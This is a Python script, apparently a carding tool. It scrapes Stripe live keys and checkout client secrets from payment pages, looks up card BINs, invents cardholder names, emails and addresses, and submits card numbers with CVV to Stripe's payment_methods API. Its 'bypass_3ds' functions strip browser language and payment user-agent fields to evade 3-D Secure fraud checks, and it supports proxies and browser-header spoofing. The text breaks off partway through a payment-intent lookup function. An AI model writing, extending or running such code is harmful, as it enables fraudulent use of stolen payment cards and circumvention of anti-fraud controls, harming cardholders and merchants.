import re
import requests
import random
import time
import json
from urllib3.util import Retry
from requests.adapters import HTTPAdapter
from colorama import init, Fore, Style
init(autoreset=True)

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options as ChromeOptions
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print(f"{Fore.YELLOW}[!] Selenium not installed. Install with: pip install selenium")
    print(f"{Fore.YELLOW}[!] For dynamic checkout pages, Selenium is required.")

# ------------------- CONFIG -------------------
PROXIES = None  # Example: {"http": "http://user:pass@1.2.3.4:8080", "https": "..."}
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

# ------------------- RANDOM NAMES -------------------
FIRST_NAMES = [
    "James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", 
    "Thomas", "Christopher", "Daniel", "Matthew", "Anthony", "Mark", "Donald", 
    "Steven", "Andrew", "Kenneth", "Joshua", "Kevin", "Brian", "George", "Timothy",
    "Mary", "Patricia", "Jennifer", "Linda", "Elizabeth", "Barbara", "Susan", 
    "Jessica", "Sarah", "Karen", "Lisa", "Nancy", "Betty", "Margaret", "Sandra",
    "Ashley", "Kimberly", "Emily", "Donna", "Michelle", "Carol", "Amanda", "Melissa"
]

LAST_NAMES = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson",
    "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Thompson", "White",
    "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young",
    "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green",
    "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter"
]

def random_name():
    """Generate a random realistic cardholder name"""
    return f"{random.choice(FIRST_NAMES)} {random.choice(LAST_NAMES)}"

def random_email():
    """Generate a random email"""
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "proton.me"]
    return f"user{random.randint(1000, 9999)}@{random.choice(domains)}"

# ------------------- SESSION SETUP -------------------
session = requests.Session()
retries = Retry(total=3, backoff_factor=1, status_forcelist=[429, 500, 502, 503, 504])
session.mount("https://", HTTPAdapter(max_retries=retries))

# ------------------- BIN LOOKUP -------------------
def get_bin_info(card_number):
    """Fetch BIN information from bins.antipublic.cc"""
    try:
        bin_num = card_number[:6]
        url = f"https://bins.antipublic.cc/bins/{bin_num}"
        headers = {
            "Accept": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code == 200:
            data = r.json()
            return {
                'brand': data.get('brand', 'UNKNOWN'),
                'type': data.get('type', 'UNKNOWN'),
                'level': data.get('level', 'STANDARD'),
                'bank': data.get('bank', 'Unknown'),
                'country': data.get('country_name', 'Unknown'),
                'flag': data.get('country_flag', '')
            }
    except:
        pass
    
    return {
        'brand': 'UNKNOWN',
        'type': 'UNKNOWN',
        'level': 'STANDARD',
        'bank': 'Unknown',
        'country': 'Unknown',
        'flag': ''
    }

# ------------------- DYNAMIC PAGE EXTRACTION (FOR CHECKOUT.STRIPE.COM) -------------------
def extract_from_dynamic_page(url):
    """
    Use browser automation to load page and extract keys from JavaScript
    This is needed for checkout.stripe.com pages where keys are loaded dynamically
    """
    if not SELENIUM_AVAILABLE:
        print(f"{Fore.RED}[-] Selenium required for this page type")
        print(f"{Fore.YELLOW}[*] Install with: pip install selenium")
        return None
    
    print(f"{Fore.CYAN}[*] Using browser automation to extract keys...")
    
    # Setup headless Chrome
    chrome_options = ChromeOptions()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
    
    driver = None
    try:
        driver = webdriver.Chrome(options=chrome_options)
        driver.set_page_load_timeout(30)
        
        print(f"{Fore.CYAN}[*] Loading page...")
        driver.get(url)
        
        # Wait for page to load
        time.sleep(5)
        
        # Try to extract pk and cs from JavaScript variables
        pk = None
        cs = None
        
        # Strategy 1: Search all script variables
        try:
            pk = driver.execute_script("""
                // Search window object for pk_live
                for (let key in window) {
                    try {
                        let val = window[key];
                        if (typeof val === 'string' && val.startsWith('pk_live_')) {
                            return val;
                        }
                        // Check nested objects
                        if (typeof val === 'object' && val !== null) {
                            for (let k2 in val) {
                                if (typeof val[k2] === 'string' && val[k2].startsWith('pk_live_')) {
                                    return val[k2];
                                }
                            }
                        }
                    } catch(e) {}
                }
                return null;
            """)
        except:
            pass
        
        # Strategy 2: Search for cs_live
        try:
            cs = driver.execute_script("""
                // Search window object for cs_live
                for (let key in window) {
                    try {
                        let val = window[key];
                        if (typeof val === 'string' && val.startsWith('cs_live_')) {
                            return val;
                        }
                        // Check nested objects
                        if (typeof val === 'object' && val !== null) {
                            for (let k2 in val) {
                                if (typeof val[k2] === 'string' && val[k2].startsWith('cs_live_')) {
                                    return val[k2];
                                }
                            }
                        }
                    } catch(e) {}
                }
                return null;
            """)
        except:
            pass
        
        # Strategy 3: Check page source as fallback
        if not pk or not cs:
            page_source = driver.page_source
            if not pk:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', page_source)
                if pk_match:
                    pk = pk_match.group(0)
            if not cs:
                cs_match = re.search(r'cs_live_[a-zA-Z0-9_]+', page_source)
                if cs_match:
                    cs = cs_match.group(0)
        
        if pk:
            print(f"{Fore.GREEN}  ✓ Found pk_live via browser")
        if cs:
            print(f"{Fore.GREEN}  ✓ Found cs_live via browser")
        
        return {'pk': pk, 'cs': cs}
        
    except Exception as e:
        print(f"{Fore.RED}[-] Browser automation error: {str(e)}")
        return None
    finally:
        if driver:
            driver.quit()

# ------------------- PAGE EXTRACTION -------------------
def fetch_page(url):
    """Fetch page HTML with error handling"""
    try:
        r = session.get(url, headers=HEADERS, proxies=PROXIES, timeout=20)
        r.raise_for_status()
        html = r.text
        
        # Save HTML for debugging
        try:
            with open("debug_checkout.html", "w", encoding="utf-8") as f:
                f.write(html)
            print(f"{Fore.YELLOW}[*] Saved HTML to debug_checkout.html for inspection")
        except:
            pass
        
        return html
    except Exception as e:
        print(f"{Fore.RED}[-] Failed to load page: {str(e)}")
        return None

def extract_checkout_data(html):
    """
    Enhanced extraction for pay.stripe.com and checkout.stripe.com links
    Extracts: pk_live, cs_live, product name, price, email
    """
    # ========== STEP 1: EXTRACT PK_LIVE (PRIORITY) ==========
    pk = None
    
    print(f"{Fore.CYAN}[*] Searching for pk_live key...")
    
    # Strategy 1: Direct pk_live pattern (most common)
    pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', html)
    if pk_match:
        pk = pk_match.group(0)
        print(f"{Fore.GREEN}  ✓ Found via direct pattern")
    
    # Strategy 2: JavaScript Stripe object initialization
    # Stripe('pk_live_...') or Stripe("pk_live_...")
    if not pk:
        pk_match = re.search(r'Stripe\s*\(\s*["\']([a-zA-Z0-9_]+)["\']\s*\)', html)
        if pk_match and 'pk_live_' in pk_match.group(1):
            pk = pk_match.group(1)
            print(f"{Fore.GREEN}  ✓ Found via Stripe() initialization")
    
    # Strategy 3: JSON format "pk":"pk_live_..."
    if not pk:
        pk_match = re.search(r'["\']pk["\']\s*:\s*["\']([a-zA-Z0-9_]+)["\']', html)
        if pk_match and 'pk_live_' in pk_match.group(1):
            pk = pk_match.group(1)
            print(f"{Fore.GREEN}  ✓ Found via JSON 'pk' field")
    
    # Strategy 4: publicKey or publishableKey
    if not pk:
        pk_match = re.search(r'["\'](?:publicKey|publishableKey|stripePublicKey)["\']\s*:\s*["\']([a-zA-Z0-9_]+)["\']', html)
        if pk_match and 'pk_live_' in pk_match.group(1):
            pk = pk_match.group(1)
            print(f"{Fore.GREEN}  ✓ Found via publicKey field")
    
    # Strategy 5: JavaScript variable assignment
    # var stripeKey = "pk_live_..." or const STRIPE_KEY = "pk_live_..."
    if not pk:
        pk_patterns = [
            r'(?:var|const|let)\s+\w*[sS]tripe\w*\s*=\s*["\']([a-zA-Z0-9_]+)["\']',
            r'(?:var|const|let)\s+\w*[pP]ublish\w*\s*=\s*["\']([a-zA-Z0-9_]+)["\']',
            r'(?:var|const|let)\s+\w*[kK]ey\w*\s*=\s*["\']([a-zA-Z0-9_]+)["\']'
        ]
        for pattern in pk_patterns:
            pk_match = re.search(pattern, html)
            if pk_match and 'pk_live_' in pk_match.group(1):
                pk = pk_match.group(1)
                print(f"{Fore.GREEN}  ✓ Found via JavaScript variable")
                break
    
    # Strategy 6: Data attributes (data-stripe-key, data-pk, etc.)
    if not pk:
        pk_match = re.search(r'data-(?:stripe-key|pk|publishable-key)\s*=\s*["\']([a-zA-Z0-9_]+)["\']', html)
        if pk_match and 'pk_live_' in pk_match.group(1):
            pk = pk_match.group(1)
            print(f"{Fore.GREEN}  ✓ Found via data attribute")
    
    # Strategy 7: Script tag with text content
    if not pk:
        script_tags = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL | re.IGNORECASE)
        for script in script_tags:
            pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', script)
            if pk_match:
                pk = pk_match.group(0)
                print(f"{Fore.GREEN}  ✓ Found in <script> tag")
                break
    
    if not pk:
        print(f"{Fore.RED}[-] Could not find pk_live key in page")
        return None
    
    print(f"{Fore.GREEN}[✓] PK_LIVE extracted: {pk[:35]}...")

    # ========== STEP 2: EXTRACT CS_LIVE (CLIENT SECRET) ==========
    cs = None
    
    print(f"{Fore.CYAN}[*] Searching for cs_live (client_secret)...")
    
    # Strategy 1: Direct cs_live pattern (most reliable)
    cs_match = re.search(r'cs_live_[a-zA-Z0-9_]+', html)
    if cs_match:
        cs = cs_match.group(0)
        print(f"{Fore.GREEN}  ✓ Found via direct pattern")
    
    # Strategy 2: "client_secret":"cs_live_..." or "clientSecret":"cs_live_..."
    if not cs:
        cs_match = re.search(r'["\']client_?[sS]ecret["\']\s*:\s*["\']([a-zA-Z0-9_]+)["\']', html)
        if cs_match and 'cs_live_' in cs_match.group(1):
            cs = cs_match.group(1)
            print(f"{Fore.GREEN}  ✓ Found via JSON clientSecret field")
    
    # Strategy 3: payment_intent_client_secret
    if not cs:
        cs_match = re.search(r'["\']payment_intent_client_secret["\']\s*:\s*["\']([a-zA-Z0-9_]+)["\']', html)
        if cs_match and 'cs_live_' in cs_match.group(1):
            cs = cs_match.group(1)
            print(f"{Fore.GREEN}  ✓ Found via payment_intent_client_secret")
    
    # Strategy 4: JavaScript variable assignment
    if not cs:
        cs_patterns = [
            r'(?:var|const|let)\s+\w*[cC]lient[sS]ecret\w*\s*=\s*["\']([a-zA-Z0-9_]+)["\']',
            r'(?:var|const|let)\s+\w*[sS]ecret\w*\s*=\s*["\']([a-zA-Z0-9_]+)["\']'
        ]
        for pattern in cs_patterns:
            cs_match = re.search(pattern, html)
            if cs_match and 'cs_live_' in cs_match.group(1):
                cs = cs_match.group(1)
                print(f"{Fore.GREEN}  ✓ Found via JavaScript variable")
                break
    
    # Strategy 5: In script tags
    if not cs:
        script_tags = re.findall(r'<script[^>]*>(.*?)</script>', html, re.DOTALL | re.IGNORECASE)
        for script in script_tags:
            cs_match = re.search(r'cs_live_[a-zA-Z0-9_]+', script)
            if cs_match:
                cs = cs_match.group(0)
                print(f"{Fore.GREEN}  ✓ Found in <script> tag")
                break
    
    if not cs:
        print(f"{Fore.RED}[-] Could not find cs_live (client_secret)")
        return None
    
    print(f"{Fore.GREEN}[✓] CS_LIVE extracted: {cs[:35]}...")

    # ========== STEP 3: FETCH ALL DETAILS FROM PAYMENT_PAGES API (PRIMARY METHOD) ==========
    # This is the best method - gets product name, price, email directly from Stripe
    checkout_details = fetch_checkout_details_from_api(pk, cs)
    
    if checkout_details:
        return {
            "pk": pk,
            "cs": cs,
            "product": checkout_details['product'],
            "price": checkout_details['price'],
            "email": checkout_details['email'],
            "currency": checkout_details['currency'],
            "amount_cents": checkout_details.get('amount_cents', 0),
            "country": checkout_details.get('country', 'US')
        }
    
    # If payment_pages API fails, try payment intent API
    print(f"{Fore.YELLOW}[!] payment_pages API failed, trying payment_intents API...")
    api_details = get_payment_intent_details(pk, cs)
    
    if api_details:
        print(f"{Fore.GREEN}  ✓ Retrieved product info from payment_intents API")
        amount_cents = int(api_details['amount'] * 100) if 'amount' in api_details else 0
        return {
            "pk": pk,
            "cs": cs,
            "product": api_details['product'],
            "price": f"{api_details['currency']} {api_details['amount']:.2f}",
            "email": api_details['email'] if api_details['email'] else "Not provided",
            "currency": api_details['currency'],
            "amount_cents": amount_cents,
            "country": "US"  # payment_intents doesn't provide country
        }
    
    # If both APIs fail, fall back to HTML extraction
    print(f"{Fore.YELLOW}[!] All API methods failed, extracting from HTML...")
    
    # 4. Product Name - Multiple strategies
    product = "Unknown Product"
    
    # Try page title
    title_match = re.search(r'<title>([^<]+)</title>', html, re.IGNORECASE)
    if title_match:
        product = title_match.group(1).split(' - ')[0].split(' | ')[0].strip()
    
    # Try meta description
    if product == "Unknown Product":
        desc_match = re.search(r'<meta[^>]*name=["\']description["\'][^>]*content=["\'](([^"\']+)["\']', html, re.IGNORECASE)
        if desc_match:
            product = desc_match.group(1).strip()
    
    # Try product name in JSON-LD
    if product == "Unknown Product":
        jsonld_match = re.search(r'"name":"([^"]+)"', html)
        if jsonld_match:
            product = jsonld_match.group(1).strip()

    # 4. Price/Amount extraction
    price = "Unknown"
    currency = "USD"
    
    # Try amount_total
    amount_match = re.search(r'"amount_total":(\d+)', html)
    if not amount_match:
        amount_match = re.search(r'"amount":(\d+)', html)
    
    # Try currency
    curr_match = re.search(r'"currency":"([A-Z]{3})"', html, re.IGNORECASE)
    
    amount_cents = 0
    if amount_match:
        amount_cents = int(amount_match.group(1))
        amount = amount_cents / 100  # Stripe uses cents
        if curr_match:
            currency = curr_match.group(1).upper()
        price = f"{currency} {amount:.2f}"

    # 5. Email extraction
    email = ""
    email_match = re.search(r'"email":"([^"]+@[^"]+)"', html)
    if not email_match:
        email_match = re.search(r'"customerEmail":"([^"]+@[^"]+)"', html)
    if email_match:
        email = email_match.group(1)

    return {
        "pk": pk,
        "cs": cs,
        "product": product,
        "price": price,
        "email": email if email else "Not provided",
        "currency": currency,
        "amount_cents": amount_cents,
        "country": "US"  # HTML extraction doesn't provide country
    }

# ------------------- 3D BYPASS FUNCTIONS -------------------
def strip_browser_language(body_str):
    """
    Remove browserLanguage and locale patterns from request body
    This bypasses Stripe's 3DS fingerprinting (from AutoCo Extension)
    """
    import urllib.parse
    
    # Work with the string directly
    body = body_str
    
    # Remove browserLanguage field (URL-encoded format)
    body = re.sub(r'%22browserLanguage%22%3A%22[^%"]*%22', '%22browserLanguage%22%3A%22%22', body)
    
    # Remove browserLanguage field (JSON format)
    body = re.sub(r'"browserLanguage":"[^"]*"', '"browserLanguage":""', body)
    
    # Remove locale patterns like 'en-US', 'fr-FR', etc.
    body = re.sub(r'[a-z]{2}-[A-Z]{2}', '', body)
    
    return body

def remove_payment_user_agent(body_str):
    """
    Remove payment_user_agent parameter from request
    This improves 3DS bypass success rate (from AutoCo Extension)
    """
    body = body_str
    
    # Remove payment_user_agent parameter
    body = re.sub(r'[&?]payment_user_agent=[^&]*', '', body)
    body = re.sub(r'[&?]payment_method_data%5Bpayment_user_agent%5D=[^&]*', '', body)
    
    # Clean up any double ampersands
    body = re.sub(r'&&+', '&', body)
    body = body.strip('&')
    
    return body

# ------------------- STRIPE API FUNCTIONS -------------------
# Generate random IDs for Stripe tracking
import uuid

def generate_stripe_ids():
    """Generate random tracking IDs for Stripe requests"""
    return {
        'guid': str(uuid.uuid4()) + str(uuid.uuid4()).replace('-', '')[:8],
        'muid': str(uuid.uuid4()) + str(uuid.uuid4()).replace('-', '')[:6],
        'sid': str(uuid.uuid4()) + str(uuid.uuid4()).replace('-', '')[:6]
    }

def get_address_for_country(country_code):
    """Get realistic address for country code"""
    addresses = {
        'US': {'line1': '123+Main+St', 'city': 'New+York', 'state': 'NY', 'postal_code': '10001'},
        'GB': {'line1': '10+Downing+St', 'city': 'London', 'state': '', 'postal_code': 'SW1A+2AA'},
        'CA': {'line1': '123+Maple+Ave', 'city': 'Toronto', 'state': 'ON', 'postal_code': 'M5H+2N2'},
        'AU': {'line1': '45+George+St', 'city': 'Sydney', 'state': 'NSW', 'postal_code': '2000'},
        'IN': {'line1': '123+MG+Road', 'city': 'Mumbai', 'state': 'MH', 'postal_code': '400001'},
        'DE': {'line1': 'Hauptstrasse+10', 'city': 'Berlin', 'state': '', 'postal_code': '10115'},
        'FR': {'line1': '10+Rue+de+Rivoli', 'city': 'Paris', 'state': '', 'postal_code': '75001'},
        'SG': {'line1': '1+Raffles+Place', 'city': 'Singapore', 'state': '', 'postal_code': '048616'},
    }
    return addresses.get(country_code, addresses['US'])

def create_payment_method(pk, cs, cc, mm, yy, cvv, cardholder_name, email, country='US', bypass_3ds=True):
    """Create Stripe payment method using proper Stripe checkout flow with 3D bypass"""
    
    ids = generate_stripe_ids()
    address = get_address_for_country(country)
    
    headers = {
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'cache-control': 'no-cache',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://checkout.stripe.com',
        'pragma': 'no-cache',
        'priority': 'u=1, i',
        'referer': 'https://checkout.stripe.com/',
        'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
    }
    
    # Build the data payload with country-specific address
    state_param = f"billing_details[address][state]={address['state']}&" if address['state'] else ''
    
    data = (
        f'type=card&'
        f'card[number]={cc}&'
        f'card[cvc]={cvv}&'
        f'card[exp_month]={mm}&'
        f'card[exp_year]={yy}&'
        f'billing_details[name]={cardholder_name.replace(" ", "+")}&'
        f'billing_details[email]={email}&'
        f"billing_details[address][line1]={address['line1']}&"
        f"billing_details[address][city]={address['city']}&"
        f"{state_param}"
        f"billing_details[address][postal_code]={address['postal_code']}&"
        f'billing_details[address][country]={country}&'
        f'guid={ids["guid"]}&'
        f'muid={ids["muid"]}&'
        f'sid={ids["sid"]}&'
        f'key={pk}&'
        f'payment_user_agent=stripe.js%2Fcba9216f35%3B+stripe-js-v3%2Fcba9216f35%3B+checkout&'
        f'client_attribution_metadata[client_session_id]={str(uuid.uuid4())}&'
        f'client_attribution_metadata[checkout_session_id]={cs}&'
        f'client_attribution_metadata[merchant_integration_source]=checkout&'
        f'client_attribution_metadata[merchant_integration_version]=hosted_checkout&'
        f'client_attribution_metadata[payment_method_selection_flow]=merchant_specified&'
        f'client_attribution_metadata[checkout_config_id]={str(uuid.uuid4())}'
    )
    
    # Apply 3D bypass techniques
    if bypass_3ds:
        print(f"{Fore.YELLOW}  [3DS Bypass] Stripping browser language and payment user agent...{Style.RESET_ALL}")
        data = strip_browser_language(data)
        data = remove_payment_user_agent(data)
    
    try:
        r = session.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data, timeout=15)
        
        if r.status_code == 200:
            response_data = r.json()
            pm_id = response_data.get('id')
            if pm_id:
                return pm_id
        else:
            try:
                error_data = r.json()
                error_msg = error_data.get('error', {}).get('message', 'Unknown error')
                error_code = error_data.get('error', {}).get('code', 'unknown')
                return {'error': f"{error_code}: {error_msg}"}
            except:
                return {'error': f"HTTP {r.status_code}"}
            
    except Exception as e:
        return {'error': str(e)}
    
    return None

def fetch_checkout_details_from_api(pk, cs):
    """
    Fetch complete checkout details from Stripe payment_pages/init API
    This gives us product name, price, email, and all other details
    """
    try:
        url = f"https://api.stripe.com/v1/payment_pages/{cs}/init"
        
        headers = {
            'accept': 'application/json',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'no-cache',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://checkout.stripe.com',
            'pragma': 'no-cache',
            'priority': 'u=1, i',
            'referer': 'https://checkout.stripe.com/',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        
        data = {
            'eid': 'NA',
            'browser_locale': 'en-GB',
            'browser_timezone': 'Asia/Calcutta',
            'redirect_type': 'url',
        }
        
        # Add key only if pk is provided
        if pk:
            data['key'] = pk
        
        print(f"{Fore.CYAN}[*] Fetching checkout details from Stripe API...")
        print(f"{Fore.CYAN}[*] URL: {url}")
        if pk:
            print(f"{Fore.CYAN}[*] PK: {pk[:30]}...")
        else:
            print(f"{Fore.CYAN}[*] PK: None (will extract from API response)")
        
        r = session.post(url, headers=headers, data=data, timeout=15)
        
        print(f"{Fore.CYAN}[*] API Response Status: {r.status_code}")
        
        if r.status_code == 200:
            data = r.json()
            
            # Debug: Save full response for troubleshooting
            try:
                with open("debug_api_response.json", "w", encoding="utf-8") as f:
                    json.dump(data, f, indent=2)
                print(f"{Fore.CYAN}[*] Saved API response to debug_api_response.json")
            except:
                pass
            
            # Helper function to recursively search for product name
            def find_product_name(obj, depth=0):
                if depth > 10:  # Prevent infinite recursion
                    return None
                
                if isinstance(obj, dict):
                    # Check if this dict has product.name
                    if 'product' in obj and isinstance(obj['product'], dict):
                        if 'name' in obj['product']:
                            name = obj['product']['name']
                            if name and name != 'Subscription creation':
                                return name
                    
                    # Recursively search all dict values
                    for value in obj.values():
                        result = find_product_name(value, depth + 1)
                        if result:
                            return result
                
                elif isinstance(obj, list):
                    # Search all list items
                    for item in obj:
                        result = find_product_name(item, depth + 1)
                        if result:
                            return result
                
                return None
            
            # Extract product information
            product_name = "Unknown Product"
            price = "Unknown"
            currency = "USD"
            email = "Not provided"
            amount_cents = 0
            
            # Strategy 1: Get from invoice.amount_due (for subscriptions)
            if 'invoice' in data and isinstance(data['invoice'], dict):
                if 'amount_due' in data['invoice']:
                    amount_cents = data['invoice']['amount_due']
                    currency = data['invoice'].get('currency', data.get('currency', 'USD')).upper()
                    price = f"{currency} {amount_cents / 100:.2f}"
            
            # Strategy 2: Get from line_item_group (for payment mode)
            if amount_cents == 0 and 'line_item_group' in data and isinstance(data['line_item_group'], dict):
                if 'total' in data['line_item_group']:
                    amount_cents = data['line_item_group']['total']
                    currency = data['line_item_group'].get('currency', data.get('currency', 'USD')).upper()
                    price = f"{currency} {amount_cents / 100:.2f}"
                elif 'due' in data['line_item_group']:
                    amount_cents = data['line_item_group']['due']
                    currency = data['line_item_group'].get('currency', data.get('currency', 'USD')).upper()
                    price = f"{currency} {amount_cents / 100:.2f}"
            
            # Strategy 3: Get from top-level amount_total
            if amount_cents == 0 and 'amount_total' in data:
                amount_cents = data['amount_total']
                currency = data.get('currency', 'USD').upper()
                price = f"{currency} {amount_cents / 100:.2f}"
            
            # Strategy 2: Try to get line items (products)
            # Check both direct line_items and line_item_group.line_items
            line_items_to_check = None
            if 'line_items' in data and data['line_items']:
                line_items_to_check = data['line_items']
            elif 'line_item_group' in data and isinstance(data['line_item_group'], dict):
                if 'line_items' in data['line_item_group'] and data['line_item_group']['line_items']:
                    line_items_to_check = data['line_item_group']['line_items']
            
            if line_items_to_check:
                first_item = line_items_to_check[0]
                
                # Try to get product name - check 'name' field first (for line_item_group items)
                if 'name' in first_item and first_item['name']:
                    product_name = first_item['name']
                # Try to get product name from nested product object
                elif 'product' in first_item and isinstance(first_item['product'], dict):
                    product_name = first_item['product'].get('name', product_name)
                # Also check price -> product -> name
                elif 'price' in first_item and isinstance(first_item['price'], dict):
                    if 'product' in first_item['price'] and isinstance(first_item['price']['product'], dict):
                        product_name = first_item['price']['product'].get('name', product_name)
                else:
                    product_name = first_item.get('description', product_name)
                
                # Extract amount from line item (multiple strategies) - only if not already extracted
                if amount_cents == 0:
                    if 'amount_total' in first_item:
                        amount_cents = first_item['amount_total']
                        currency = first_item.get('currency', 'USD').upper()
                        price = f"{currency} {amount_cents / 100:.2f}"
                    # Try price.unit_amount (for subscriptions)
                    elif 'price' in first_item and isinstance(first_item['price'], dict):
                        if 'unit_amount' in first_item['price']:
                            amount_cents = first_item['price']['unit_amount']
                            currency = first_item['price'].get('currency', 'USD').upper()
                            price = f"{currency} {amount_cents / 100:.2f}"
                    # Try amount_subtotal
                    elif 'amount_subtotal' in first_item:
                        amount_cents = first_item['amount_subtotal']
                        currency = first_item.get('currency', 'USD').upper()
                        price = f"{currency} {amount_cents / 100:.2f}"
            
            # Strategy 3: Check subscription items for product and amount
            if 'subscription' in data and isinstance(data['subscription'], dict):
                subscription = data['subscription']
                if 'items' in subscription and subscription['items']:
                    first_sub_item = subscription['items'][0]
                    # Check direct product
                    if 'product' in first_sub_item and isinstance(first_sub_item['product'], dict):
                        if product_name == "Unknown Product":
                            product_name = first_sub_item['product'].get('name', product_name)
                    # Check price -> product
                    elif 'price' in first_sub_item and isinstance(first_sub_item['price'], dict):
                        if 'product' in first_sub_item['price'] and isinstance(first_sub_item['price']['product'], dict):
                            if product_name == "Unknown Product":
                                product_name = first_sub_item['price']['product'].get('name', product_name)
                        # Extract amount from subscription price
                        if amount_cents == 0 and 'unit_amount' in first_sub_item['price']:
                            amount_cents = first_sub_item['price']['unit_amount']
                            currency = first_sub_item['price'].get('currency', 'USD').upper()
                            price = f"{currency} {amount_cents / 100:.2f}"
            
            # Strategy 4: Try to get from payment intent
            if 'payment_intent' in data and data['payment_intent']:
                pi = data['payment_intent']
                if isinstance(pi, dict):
                    if 'amount' in pi:
                        amount_cents = pi['amount']
                        currency = pi.get('currency', 'USD').upper()
                        price = f"{currency} {amount_cents / 100:.2f}"
                    
                    if product_name == "Unknown Product":
                        product_name = pi.get('description', 'Unknown Product')
                    
                    if email == "Not provided":
                        email = pi.get('receipt_email', 'Not provided')
            
            # Strategy 4: Get from merchant/business name
            if product_name == "Unknown Product" and 'merchant' in data:
                product_name = data['merchant'].get('name', 'Unknown Product')
            
            # Strategy 5: Recursive search for product.name anywhere in JSON
            if product_name == "Unknown Product" or product_name == "Subscription creation":
                found_name = find_product_name(data)
                if found_name:
                    product_name = found_name
                    print(f"{Fore.GREEN}  ✓ Found product name via recursive search: {product_name}")
            
            # Strategy 5: Try to get customer email
            if 'customer_email' in data:
                email = data['customer_email']
            elif 'customer' in data and isinstance(data['customer'], dict):
                email = data['customer'].get('email', email)
            
            # Extract country from checkout
            country = 'US'  # Default
            if 'shipping' in data and data['shipping'] and isinstance(data['shipping'], dict):
                if 'address' in data['shipping'] and data['shipping']['address'] and isinstance(data['shipping']['address'], dict):
                    country = data['shipping']['address'].get('country', 'US')
            elif 'customer' in data and isinstance(data['customer'], dict):
                if 'address' in data['customer'] and data['customer']['address'] and isinstance(data['customer']['address'], dict):
                    country = data['customer']['address'].get('country', 'US')
            
            print(f"{Fore.GREEN}  ✓ Retrieved checkout details from API")
            print(f"{Fore.CYAN}  [Debug] Amount: {amount_cents} cents, Product: {product_name}, Country: {country}")
            
            return {
                'product': product_name,
                'price': price,
                'currency': currency,
                'email': email,
                'amount_cents': amount_cents,  # Return raw cents for confirm
                'country': country  # Return country for address
            }
        else:
            print(f"{Fore.YELLOW}[!] API returned status {r.status_code}")
            try:
                error_data = r.json()
                print(f"{Fore.YELLOW}[!] Error response: {json.dumps(error_data, indent=2)}")
                
                # Save error response for debugging
                with open("debug_error_response.json", "w", encoding="utf-8") as f:
                    json.dump(error_data, f, indent=2)
            except Exception as json_error:
                print(f"{Fore.YELLOW}[!] Response text: {r.text[:500]}")
            
    except Exception as e:
        print(f"{Fore.YELLOW}[!] Could not fetch checkout details: {str(e)}")
        import traceback
        traceback.print_exc()
    
    return None

def get_payment_intent_details(pk, cs):
    """
    Fetch payment intent details using PK and CS to get product info, amount, etc.
    This provides a fallback when HTML extraction doesn't find everything
    """
    try:
        pi_id = cs.split('_secret_')[0]
        url = f"https://api.stripe.com/v1/payment_intents/{pi_id}"
        headers = {
            "Authorization": f"Bearer {pk}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        
        r = session.get(url, headers=headers, proxies=PROXIES, timeout=10)
        if r.status_code == 200:
            data = r.json()
            
            # Extract amount and currency
            amount = data.get('amount', 0) / 100
            currency = data.get('currency', 'USD').upper()
            
            # Extract description or metadata
            description = data.get('description', 'Unknown Product')
            metadata = data.get('metadata', {})
            
            # Try to get product name from metadata or description
            product_name = metadata.get('product_name', metadata.get('name', description))
            
            # Extract customer email if available
            receipt_email = data.get('receipt_email', '')
            
